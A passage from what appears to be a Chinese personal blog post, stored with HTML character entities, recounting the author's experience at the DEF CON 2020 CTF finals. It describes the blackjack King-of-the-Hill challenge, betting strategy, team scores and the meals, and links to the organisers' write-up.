&#x7801;&#xFF0C;&#x8FD9;&#x6761;&#x8DEF;&#x5C31;&#x4F5C;&#x5E9F;&#x4E86;&#x3002;</p><p>&#x7136;&#x540E;&#x5341;&#x591A;&#x5206;&#x949F;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x6E10;&#x6E10;&#x53D1;&#x73B0;&#x8FD9;&#x4E2A;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5168;&#x5C40;&#x961F;&#x4F0D;&#x6240;&#x6709;&#x4EBA;&#x7684;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;&#xFF0C;&#x867D;&#x7136;&#x6587;&#x4EF6;&#x6709;&#x4E00;&#x5B9A;&#x683C;&#x5F0F;&#xFF0C;&#x5E76;&#x4E14;&#x7C7B;&#x4F3C;&#x4E00;&#x4E2A;&#x6307;&#x4EE4;&#x7C7B;&#x578B;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x867D;&#x7136;&#x6211;&#x4EEC;&#x5F53;&#x65F6;&#x770B;&#x4E0D;&#x61C2;&#xFF0C;&#x4F46;&#x662F;&#x53D1;&#x73B0; A0E &#x5728;&#x5F97;&#x5206;&#x4E4B;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x62FF; A0E &#x7684;&#x8FC7;&#x6765;&#x7528;&#x5C31;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5F97;&#x5206;&#x4E86;&#xFF08;</p><p>&#x540E;&#x9762;&#x624D;&#x77E5;&#x9053;&#x6211;&#x4E0A;&#x4F20;&#x7684;&#x6587;&#x4EF6;&#x662F;&#x4FEE;&#x6539;&#x4E86;&#x6211;&#x4EEC;&#x6BCF;&#x6B21;&#x4E0B;&#x6CE8;&#x7684;&#x79EF;&#x5206;&#xFF0C;&#x56E0;&#x4E3A;&#x521D;&#x59CB;&#x7684;&#x65F6;&#x5019;&#x6BCF;&#x4E2A;&#x961F;&#x90FD;&#x4E00;&#x6837;&#xFF0C;&#x4E00;&#x6B21;&#x628A;&#x81EA;&#x5BB6;&#x8EAB;&#x5BB6;200&#x4E00;&#x6B21;&#x4E0B;&#x5B8C;&#xFF0C;&#x800C;&#x8F93;&#x7684;&#x6982;&#x7387;&#x53C8;&#x5F88;&#x5927;&#xFF0C;&#x57FA;&#x672C;&#x7ACB;&#x9A6C;&#x5C31;&#x51FA;&#x5C40;&#x4E86;&#xFF0C;&#x7136;&#x800C;&#x901A;&#x8FC7;&#x4E00;&#x5F00;&#x59CB;&#x76F4;&#x63A5;&#x4E0B;&#x6CE8; 1 &#x4E2A;&#x79EF;&#x5206;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x53EF;&#x4EE5;&#x7ACB;&#x9A6C;&#x7A33;&#x4F4F;&#x6218;&#x5C40;&#xFF0C;&#x81F3;&#x5C11;&#x53EF;&#x4EE5;&#x4E0D;&#x4F1A;&#x7ACB;&#x9A6C;&#x51FA;&#x5C40;&#x5C31;&#x53EF;&#x4EE5;&#x6392;&#x524D;&#x4E94;&#x4E0A;&#x5206;&#x4E86;&#x3002;&#x4E8E;&#x662F;&#x6211;&#x4EEC;&#x4E00;&#x5F00;&#x59CB;&#x5C31;&#x5728; KOH &#x4E0A;&#x5206;&#x4E86;&#xFF0C;&#x5C31;&#x8FD9;&#x6837;&#x901A;&#x8FC7; KOH &#x5F97;&#x5206;&#xFF0C;&#x6211;&#x4EEC;&#x7A33;&#x4F4F;&#x4E86;&#x524D;&#x4E00;&#x5929;&#x7684;&#x6392;&#x540D;&#xFF0C;&#x7B2C;&#x4E00;&#x5929;&#x7684;&#x5F97;&#x5206;&#x4E5F;&#x5C31;&#x57FA;&#x672C;&#x5168;&#x90FD;&#x6765;&#x81EA;&#x4E8E; KOH &#x3002;</p><h2 id="Shift-2-amp-Shift-3"><a href="#Shift-2-amp-Shift-3" class="headerlink" title="Shift 2 &amp; Shift 3"></a>Shift 2 &amp; Shift 3</h2><p>&#x7531;&#x4E8E;&#x65F6;&#x95F4;&#x4E5F;&#x6BD4;&#x8F83;&#x4E45;&#x8FDC;&#x4E86;&#xFF0C;&#x6211;&#x8BB0;&#x7684;&#x4E0D;&#x662F;&#x7279;&#x522B;&#x6E05;&#x695A;&#xFF0C;&#x8FD9;&#x4E24;&#x4E2A; Shift &#x5C31;&#x653E;&#x4E00;&#x8D77;&#x4E86;&#x3002;&#x7531;&#x4E8E;&#x4E4B;&#x524D;&#x8C8C;&#x4F3C;&#x5927;&#x5BB6;&#x6CA1;&#x600E;&#x4E48;&#x6253; DEFCON QUALS &#x6216;&#x8005;&#x8BF4;&#x6253;&#x4E86;&#x7684;&#x5E08;&#x5085;&#x8FD9;&#x6B21; Final &#x6CA1;&#x6253;&#xFF1F;&#x6211;&#x4EEC;&#x4E00;&#x5F00;&#x59CB;&#x5E76;&#x6CA1;&#x6709;&#x53D1;&#x73B0; KOH &#x90A3;&#x4E2A;&#x9898;&#x662F;&#x6539;&#x81EA; DEFCON QUALS Fountain OOO REliving &#xFF0C;&#x662F;&#x4E00;&#x4E2A; Golly &#x76F8;&#x5173;&#x7684;&#x9006;&#x5411;&#x9898;&#xFF0C;&#x5F53;&#x65F6;&#x770B; QUALS &#x7684; WriteUp &#x4E5F;&#x662F;&#x76F8;&#x5F53;&#x5D29;&#x6E83;&#x7684;&#xFF0C;&#x7531;&#x4E8E;&#x6211;&#x8FD9;&#x4E2A;&#x5C0F;&#x83DC;&#x9E21;&#x6CA1;&#x4EC0;&#x4E48;&#x9006;&#x5411;&#x57FA;&#x7840;&#xFF0C;&#x8DDF;&#x67D0;&#x5E08;&#x5085;&#x786C;&#x7740;&#x5934;&#x76AE;&#x641E;&#x4E5F;&#x6CA1;&#x600E;&#x4E48;&#x641E;&#x51FA;&#x6765;&#xFF0C;&#x800C;&#x8FD9;&#x4E2A;&#x8FD8;&#x662F;&#x5347;&#x7EA7;&#x7248;&#xFF0C;&#x5F53;&#x65F6;&#x770B;&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x7684;&#x9644;&#x4EF6;&#x56FE;&#x8FD8;&#x662F;&#x4E00;&#x8138;&#x61F5;&#x903C;&#x7684;&#xFF1A;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://github.com/o-o-overflow/dc2020f-casinooo-life-blackjack/blob/master/controller.png?raw=true" alt></p><p>&#x5728; Golly &#x4E0A;&#x778E;&#x5F04;&#x66F4;&#x662F;&#x76F8;&#x5F53;&#x61F5;&#x903C;&#x3002;&#x867D;&#x7136;&#x9006;&#x5411;&#x5E2E;&#x4E0D;&#x4E0A;&#x5565;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x8FD8;&#x662F;&#x6BCF;&#x4E2A; ROUND &#x90FD;&#x770B;&#x4E00;&#x770B;&#x5404;&#x4E2A;&#x961F;&#x4F0D;&#x7684;&#x8868;&#x73B0;&#x4EE5;&#x53CA;&#x7B56;&#x7565;&#xFF0C;&#x7136;&#x540E;&#x53D1;&#x73B0;&#x611F;&#x89C9;&#x4E5F;&#x53EF;&#x80FD;&#x662F;&#x4E00;&#x4E2A;&#x6570;&#x5B66;&#x671F;&#x671B;&#x9898;&#xFF08;&#xFF1F;&#xFF09;&#xFF0C;&#x6211;&#x5C31;&#x5C1D;&#x8BD5;&#x7740;&#x7B97;&#x4E00;&#x4E0B;&#x6BCF;&#x6B21;&#x4E0B;&#x6CE8;&#x591A;&#x5C11;&#x624D;&#x80FD;&#x8BA9;&#x6211;&#x4EEC;&#x6BCF;&#x4E2A; ROUND &#x5927;&#x6982;&#x7387;&#x80FD;&#x5728;&#x73B0;&#x6709;&#x7684;&#x961F;&#x4F0D;&#x7B56;&#x7565;&#x4E2D;&#x80DC;&#x51FA;&#xFF0C;&#x7136;&#x540E;&#x901A;&#x8FC7;&#x4E0D;&#x65AD;&#x7684;&#x8BD5;&#x4E0D;&#x65AD;&#x7684;&#x6539;&#xFF0C;&#x540E;&#x9762;&#x57FA;&#x672C;&#x4E0A;&#x9760;&#x8FD0;&#x6C14;&#x80FD;&#x62FF;&#x4E0B;&#x4E0D;&#x5C11;&#x5206;&#xFF08;</p><p>&#x540E;&#x9762;&#x6211;&#x4EEC; AWD &#x5206;&#x6570;&#x4E5F;&#x8D77;&#x6765;&#x4E86;&#xFF0C;&#x622A;&#x6B62;&#x5230; Shift 2 &#x7ED3;&#x675F;&#xFF0C;&#x6211;&#x622A;&#x4E86;&#x4E00;&#x5F20;&#x5F53;&#x65F6;&#x7684;&#x56FE;&#x3002;&#xFF08;&#x770B;&#x7740;&#x5F53;&#x65F6;&#x7684; KOH &#x611F;&#x89C9;&#x5F53;&#x65F6;&#x8FD0;&#x6C14;&#x771F;&#x597D;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013001429.png" alt></p><p>&#x540E;&#x9762;&#x5728; Shift 3 &#x7684;&#x65F6;&#x5019;&#xFF0C;&#x8FD9;&#x4E2A; 21 &#x70B9;&#x7684;&#x9898;&#x76EE;&#x4E00;&#x5F00;&#x59CB;&#x6CA1;&#x591A;&#x4E45;&#x5C31;&#x4E0B;&#x4E86;&#xFF0C;&#x4E8E;&#x662F;&#x6211;&#x53C8;&#x5F00;&#x59CB;&#x6DF7;&#x8D77;&#x6765;&#x4E86;&#xFF0C;&#x4E5F;&#x5C31;&#x968F;&#x4FBF;&#x770B;&#x770B;&#x5E73;&#x53F0;&#xFF0C;&#x7136;&#x540E;&#x770B;&#x770B;&#x961F;&#x53CB;&#x4EEC;&#x5728;&#x5E72;&#x5565;&#xFF0C;&#x4E2D;&#x95F4;&#x8C8C;&#x4F3C;&#x6709;&#x4E00;&#x4E2A; RPG &#x6E38;&#x620F;&#x7684; AWD &#x9898;&#x76EE;&#xFF0C;&#x5F53;&#x65F6;&#x770B;&#x4ED6;&#x4EEC;&#x73A9;&#x8D77;&#x6765;&#x611F;&#x89C9;&#x5F88;&#x6709;&#x610F;&#x601D;&#xFF0C;&#x5C31;&#x662F;&#x5927;&#x5BB6;&#x901A;&#x8FC7;&#x64CD;&#x63A7;&#x81EA;&#x5DF1;&#x7684;&#x89D2;&#x8272;&#x8FDB;&#x884C;&#x5BF9;&#x5E94;&#x7684;&#x64CD;&#x4F5C;&#x62FF; Flag &#xFF0C;&#x800C;&#x4E14;&#x8FD8;&#x662F;&#x5177;&#x6709;&#x4E00;&#x5B9A;&#x5B9E;&#x65F6;&#x64CD;&#x4F5C;&#x6027;&#xFF0C;&#x603B;&#x4E4B;&#x770B;&#x8D77;&#x6765;&#x4ED6;&#x4EEC;&#x5728;&#x6253;&#x8FD9;&#x4E2A;&#x6E38;&#x620F;&#x975E;&#x5E38;&#x6709;&#x610F;&#x601D; XD</p><p>&#x7136;&#x540E;&#x540E;&#x9762;&#x53C8;&#x653E;&#x4E86;&#x4E24;&#x4E2A; KOH &#xFF0C;&#x4E00;&#x4E2A;&#x662F;&#x975E;&#x5E38; Geek &#x7684;&#x5F39;&#x7403;&#x6E38;&#x620F;&#xFF0C;&#x8FD8;&#x6709;&#x4E00;&#x4E2A;&#x662F;&#x5F00;&#x98DE;&#x8239;&#x6253;&#x98DE;&#x8239;&#x7684;&#x6E38;&#x620F;&#xFF0C;&#x4E24;&#x4E2A;&#x90FD;&#x662F;&#x9006;&#x5411;&#xFF0C;&#x4E5F;&#x8BA9;&#x6211;&#x6DF7;&#x7684;&#x662F;&#x7406;&#x76F4;&#x6C14;&#x58EE;&#xFF08;&#x5927;&#x96FE;&#xFF09;&#xFF0C;&#x867D;&#x7136;&#x6211;&#x60F3;&#x5C3D;&#x53EF;&#x80FD;&#x5730;&#x5E2E;&#x5FD9;&#xFF0C;&#x4F46;&#x662F;&#x771F;&#x662F;&#x83DC;&#x7684;&#x771F;&#x5B9E;&#xFF0C;&#x4E5F;&#x5C31;&#x5230;&#x5904;&#x770B;&#x770B;&#x6709;&#x4EC0;&#x4E48;&#x53EF;&#x4EE5;&#x5E2E;&#x5FD9;&#x7684;&#x5730;&#x65B9;&#xFF0C;&#x6BD4;&#x5982;&#xFF0C;&#x62FF;&#x5916;&#x5356;&#xFF08;&#x6D77;&#x76D7;&#x867E;&#x996D;&#x5916;&#x5356;&#x662F;&#x771F;&#x597D;&#x5403;&#xFF0C;&#x6CE1;&#x9762;&#x771F;&#x9999;&#xFF0C;&#x597D;&#x4E45;&#x6CA1;&#x5403;&#x6CE1;&#x9762;&#x4E86;&#xFF0C;&#x545C;&#x545C;&#x545C;TAT&#xFF09;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013003438.jpg" alt></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013003453.jpg" alt></p><p>&#x662F;&#x6211;&#x672C;&#x4EBA;&#x6CA1;&#x9519;&#x4E86;&#xFF08;</p><p>&#x540E;&#x9762;&#x4E3B;&#x529E;&#x65B9;&#x516C;&#x5E03;&#x4E86; 21 &#x70B9;&#x7684; WriteUp: <a href="https://github.com/o-o-overflow/dc2020f-casinooo-life-blackjack" target="_blank" rel="noopener">https://github.com/o-o-overflow/dc2020f-casinooo-life-blackjack</a> 